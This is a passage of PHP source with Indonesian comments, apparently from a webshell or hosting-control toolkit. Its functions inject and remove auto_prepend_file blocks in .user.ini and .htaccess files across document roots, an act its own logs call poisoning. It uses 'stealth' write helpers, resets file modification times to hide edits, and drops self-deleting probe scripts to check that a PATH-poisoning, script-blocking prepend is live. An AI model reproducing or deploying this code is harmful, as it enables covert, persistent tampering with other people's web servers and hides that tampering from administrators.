/* OFF per-mode ($mark = 'GSFURUSAK' atau 'GSFURUSAKWEB'): cabut HANYA blok
   marker mode ini (format baru auto_prepend + legasi disable_functions v66.6-
   ikut dicabut saat $mark='GSFURUSAK'). Backup byte-identik HANYA di-restore
   bila setelah pencabutan TIDAK ada marker mode lain tersisa — supaya OFF
   satu mode tidak menelan jalur mode yang masih aktif. */
function gsp_userini_off($dirs, $mark) {
    $log = array();
    $cdir = gsp_home() . '/.cache';
    /* 1) cabut blok marker mode ini dari tiap .user.ini */
    foreach ($dirs as $dir) {
        $f = $dir . '/.user.ini';
        if (!@is_file($f)) continue;
        $c = (string)@file_get_contents($f);
        if (strpos($c, $mark) === false) continue;
        $n2 = preg_replace('/\n?#' . $mark . '\n[^\n]*\n#' . $mark . '-END\n?/', "\n", $c); // blok baru (auto_prepend)
        if ($mark === 'GSFURUSAK') { // legasi v66.6 ke bawah
            $n2 = preg_replace('/\n?#GSFURUSAK\ndisable_functions=[^\n]*\n#GSFURUSAK-END\n?/', "\n", $n2);
            $n2 = preg_replace('/^auto_prepend_file[ \t]*=[^\n]*; GSFURUSAK[^\n]*\r?\n?/m', '', $n2);
        }
        if ($n2 === $c) continue;
        if (trim($n2) === '') { @unlink($f); $log[] = '[+] .user.ini buatan rusak dihapus: ' . $f; }
        elseif (gsp_rc_write_stealth($f, $n2) !== false) $log[] = '[+] blok #' . $mark . ' dicabut: ' . $f;
        else $log[] = '[x] gagal mencabut blok: ' . $f;
    }
    /* 2) restore BYTE-IDENTIK dari backup — HANYA bila tidak ada marker mode
       lain tersisa (mode lain masih aktif -> backup disimpan untuk OFF-nya) */
    $baks = @glob($cdir . '/.gs_userini_bak_*');
    if (is_array($baks)) foreach ($baks as $bak) {
        $raw = (string)@file_get_contents($bak);
        if (!preg_match('/^#GSPUIBAK (\S+) (\d+)\n/', $raw, $m)) { @unlink($bak); continue; }
        $target = $m[1];
        $mt = intval($m[2]);
        $body = substr($raw, strlen($m[0]));
        $cur = @is_file($target) ? (string)@file_get_contents($target) : '';
        if (strpos($cur, '#GSFURUSAK') !== false) { $log[] = '[i] restore backup ditunda (mode lain masih aktif): ' . $target; continue; }
        if (@file_put_contents($target, $body) !== false) {
            if ($mt > 0) @touch($target, $mt, $mt);
            @unlink($bak);
            $log[] = '[+] .user.ini dipulihkan byte-identik dari backup: ' . $target;
        } else $log[] = '[x] gagal restore ' . $target . ' (backup tetap disimpan: ' . $bak . ')';
    }
    /* 2b) sapu probe self-verify yang mungkin tersisa (v66.3) */
    foreach ($dirs as $dir) {
        $pbs = @glob($dir . '/.gsp_probe_*.php');
        if (is_array($pbs)) foreach ($pbs as $pb) { if (@unlink($pb)) $log[] = '[+] probe sisa dihapus: ' . $pb; }
    }
    /* 3) verifikasi marker mode ini */
    $sisa = 0;
    foreach ($dirs as $dir) {
        if (strpos((string)@file_get_contents($dir . '/.user.ini'), '#' . $mark) !== false) { $log[] = '[x] SISA marker #' . $mark . ' di: ' . $dir . '/.user.ini'; $sisa++; }
    }
    if ($sisa === 0) $log[] = '[+] verifikasi .user.ini bersih (#' . $mark . ')';
    return $log;
}
/* .htaccess vektor B (v66.7 REDESIGN — dok resmi PHP + LiteSpeed):
   php_admin_value disable_functions di .htaccess DITOLAK LiteSpeed sendiri
   ('restricted by design in PHP itself') dan disable_functions =
   PHP_INI_SYSTEM — vektor lama NO-OP. Yang dihormati: 'php_value
   auto_prepend_file "<path>"' di LiteSpeed/OpenLiteSpeed (efek INSTAN, tanpa
   cache .user.ini 5 mnt) dan Apache mod_php (SAPI apache2handler). JANGAN
   PERNAH menulis php_* di Apache CGI/FPM/nginx -> HTTP 500 seluruh docroot.
   Ditulis HANYA bila: SERVER_SOFTWARE mengandung LiteSpeed, ATAU SAPI panel
   apache2handler, ATAU .htaccess yang ada SUDAH mengandung php_value
   (bukti host menerimanya). Selain itu diskip dengan pesan jujur.
   $mark: 'GSFURUSAK' / 'GSFURUSAKWEB' (dua jalur terpisah). */
function gsp_htaccess_block($ppath, $mark) {
    return '#' . $mark . "\n" . 'php_value auto_prepend_file "' . str_replace('"', '', strval($ppath)) . '"' . "\n" . '#' . $mark . "-END\n";
}
function gsp_htaccess_on($dirs, $ppath, $mark) {
    $log = array();
    if ($ppath === '' || $ppath === false) { $log[] = '[i] .htaccess diskip (path prepend kosong)'; return $log; }
    $sw = isset($_SERVER['SERVER_SOFTWARE']) ? strval($_SERVER['SERVER_SOFTWARE']) : '';
    $ls = (stripos($sw, 'litespeed') !== false);
    $mp = (function_exists('php_sapi_name') && php_sapi_name() === 'apache2handler');
    $wrote = false;
    foreach ($dirs as $dir) {
        $f = $dir . '/.htaccess';
        $has = @is_file($f) ? (string)@file_get_contents($f) : '';
        if (!$ls && !$mp && stripos($has, 'php_value') === false) continue; // bukan LSWS/mod_php & belum terbukti menerima php_value
        /* idempotent: cabut blok marker ini (format baru & legasi disable_functions) */
        $c = preg_replace('/\n?#' . $mark . '\nphp_value auto_prepend_file[^\n]*\n#' . $mark . '-END\n?/', "\n", $has);
        $c = preg_replace('/\n?#' . $mark . '\nphp_(?:admin_)?value disable_functions[^\n]*\n(?:php_value auto_prepend_file[^\n]*\n)?#' . $mark . '-END\n?/', "\n", $c);
        if (gsp_rc_write_stealth($f, rtrim($c) . "\n" . gsp_htaccess_block($ppath, $mark)) !== false) {
            $log[] = '[+] .htaccess diracuni (php_value auto_prepend_file -> ' . basename($ppath) . ' — LiteSpeed/mod_php, efek INSTAN): ' . $f;
            $wrote = true;
        }
    }
    if (!$wrote) $log[] = '[i] .htaccess diskip (bukan LiteSpeed/mod_php — php_* di FPM/CGI/nginx = HTTP 500; andalkan .user.ini)';
    return $log;
}
function gsp_htaccess_off($dirs, $mark) {
    $log = array();
    foreach ($dirs as $dir) {
        $f = $dir . '/.htaccess';
        if (!@is_file($f)) continue;
        $c = (string)@file_get_contents($f);
        if (strpos($c, '#' . $mark) === false) continue;
        /* cabut HANYA blok bermarker mode ini — isi .htaccess lain utuh
           (format baru auto_prepend + legasi disable_functions ikut dicabut) */
        $n2 = preg_replace('/\n?#' . $mark . '\nphp_value auto_prepend_file[^\n]*\n#' . $mark . '-END\n?/', "\n", $c);
        $n2 = preg_replace('/\n?#' . $mark . '\nphp_(?:admin_)?value disable_functions[^\n]*\n(?:php_value auto_prepend_file[^\n]*\n)?#' . $mark . '-END\n?/', "\n", $n2);
        if (trim($n2) === '') { @unlink($f); $log[] = '[+] .htaccess buatan rusak dihapus: ' . $f; }
        elseif (gsp_rc_write_stealth($f, $n2) !== false) $log[] = '[+] blok htaccess #' . $mark . ' dicabut (isi lain utuh): ' . $f;
    }
    return $log;
}
/* SELF-VERIFY jujur (v66.7): tulis probe sementara di tiap docroot, minta
   via HTTP ke diri sendiri, HAPUS probe. Verdict bukan lagi disable_functions
   (PHP_INI_SYSTEM — mustahil dari user level) melainkan apakah prepend PATH-
   poison AKTIF: probe membaca getenv('PATH') — prepend .p.php menggantinya
   ke fakebin dir, jadi PATH mengandung '/.b' -> TERCEMAR (webshell naif
   kehilangan perintah umum). BERSIH = prepend belum aktif (cache .user.ini
   FPM s/d 5 mnt, atau host tidak menghormati .user.ini/.htaccess). */
function gsp_userini_probe($dirs) {
    $log = array();
    $verd = array();
    $dr = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim(str_replace('\\', '/', strval($_SERVER['DOCUMENT_ROOT'])), '/') : '';
    $scheme = (isset($_SERVER['HTTPS']) && strval($_SERVER['HTTPS']) !== '' && strval($_SERVER['HTTPS']) !== 'off') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? trim(strval($_SERVER['HTTP_HOST'])) : '';
    foreach ($dirs as $dir) {
        $url = '';
        if ($dr !== '' && $host !== '' && ($dir === $dr || strpos($dir, $dr . '/') === 0))
            $url = $scheme . '://' . $host . substr($dir, strlen($dr));
        elseif (preg_match('#/domains/([^/]+)/public_html$#', $dir, $mm))
            $url = $scheme . '://' . $mm[1];
        if ($url === '') { $log[] = '[i] ' . $dir . ': tidak bisa dipetakan ke URL — verdict dilewati'; continue; }
        $pn = '.gsp_probe_' . substr(md5(uniqid(mt_rand(), true)), 0, 10) . '.php';
        $pf = $dir . '/' . $pn;
        $code = '<?php $gsp_p=strval(getenv(\'PATH\')); echo (strpos($gsp_p,\'/.b\')!==false)?\'POISONED\':\'CLEAN\';';
        if (@file_put_contents($pf, $code) === false) { $log[] = '[x] gagal nulis probe: ' . $pf; continue; }
        @chmod($pf, 0644);
        $r = gsfu_http_probe($url . '/' . $pn);
        @unlink($pf); /* probe SELALU dihapus lagi */
        /* v66.8: prepend gabungan menjawab 403 'server function disabled!!'
           untuk SEMUA script non-allowlist — probe sendiri kena 403 = bukti
           paling kuat bahwa prepend AKTIF (webshell mati total) */
        if (is_array($r) && $r[0] === 403 && strpos($r[1], 'server function disabled!!') !== false) {
            $verd[$dir] = 'EFEKTIF'; $log[] = '[+] EFEKTIF: ' . $dir . ' — probe HTTP dijawab 403 \'server function disabled!!\' (prepend keras aktif: webshell mati total)';
        }
        elseif (is_array($r) && $r[0] === 200) {
            if (strpos($r[1], 'POISONED') !== false) { $verd[$dir] = 'EFEKTIF'; $log[] = '[+] EFEKTIF: ' . $dir . ' — probe HTTP: PATH tercemar fakebin (prepend aktif)'; }
            elseif (strpos($r[1], 'CLEAN') !== false) { $verd[$dir] = 'BELUM'; $log[] = '[!] BELUM aktif: ' . $dir . ' — probe HTTP: PATH masih bersih (prepend belum termuat)'; }
            else { $verd[$dir] = 'TAK-JELAS'; $log[] = '[!] probe HTTP 200 tapi isi tak dikenal di ' . $dir . ' (output: ' . substr(trim(strip_tags($r[1])), 0, 60) . ')'; }
        } else {
            $log[] = '[i] probe HTTP gagal di ' . $dir . ' (' . (is_array($r) ? 'HTTP ' . $r[0] : 'tanpa respon') . ') — verdict tak tersedia';
        }
    }
    $dead = 0; $alive = 0;
    foreach ($verd as $v) { if ($v === 'EFEKTIF') $dead++; elseif ($v === 'BELUM') $alive++; }
    if ($dead === 0 && $alive > 0)
        $log[] = '[!] JUJUR: prepend belum aktif di SEMUA docroot terprobe — kemungkinan cache .user.ini PHP-FPM (tunggu s/d 5 menit lalu probe ulang via klik MODE RUSAK lagi) atau host tidak menghormati .user.ini & bukan LiteSpeed/mod_php';
    elseif ($alive > 0)
        $log[] = '[!] SEBAGIAN docroot belum tercemar (' . $alive . ' belum, ' . $dead . ' efektif) — tunggu cache .user.ini s/d 5 menit; di LiteSpeed harusnya instan via .htaccess';
    elseif ($dead > 0)
        $log[] = '[+] SEMUA docroot teruji TERCEMAR (' . $dead . ') — webshell naif kehilangan perintah umum di semuanya';
    $log[] = '[i] catatan: cache .user.ini PHP-FPM bisa menunda efek s/d 5 menit — verdict BELUM sesaat setelah ON bisa berubah jadi TERCEMAR';
    return $log;
}
/* log MODE RUSAK ke file (hasil ON/OFF + verdict probe) */
function gsp_rusak_log($lines) {
    $lf = gsp_home() . '/.cache/.gs_rusak.log';
    $old = @is_file($lf) ? (string)@file_get_contents($lf) : '';
    $rows = explode("\n", $old);
    while (count($rows) > 200) array_shift($rows);
    $rows[] = '===== ' . date('Y-m-d H:i:s') . ' =====';
    foreach ($lines as $l) $rows[] = $l;
    if (@file_put_contents($lf, implode("\n", $rows)) !== false) { @chmod($lf, 0600); gsp_stealth_age($lf); }
}

